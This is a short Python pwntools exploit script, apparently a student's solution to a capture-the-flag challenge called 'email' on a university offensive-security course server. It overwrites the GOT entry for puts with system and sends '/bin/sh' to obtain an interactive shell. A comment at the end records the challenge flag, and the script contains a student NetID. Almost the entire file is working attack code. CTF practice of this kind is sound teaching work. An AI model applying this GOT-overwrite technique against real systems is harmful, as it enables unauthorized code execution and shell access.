from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./email"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1295
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     set follow-fork-mode parent
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
system_addr = e.symbols.system
puts_got_addr = e.got.puts

print(p.recvuntil(b": ").decode())
p.send(p64(system_addr) + p64(puts_got_addr))
log.info(f"Sending system address along with GOT puts address: {hex(system_addr)} {hex(puts_got_addr)}")

print(p.recvuntil(b": ").decode())
p.send(b"F"*8)
log.info("Sending junk data: " + "F"*8)

print(p.recvuntil(b": ").decode())
p.send(b"/bin/sh\x00")
log.info("Sending command: /bin/sh")

p.interactive()

# flag{0v3rwr1t1ng_3ntr1es_1n_th3_G0T_f0r_th3_W1n!_4bf885fa2d0e2e28}
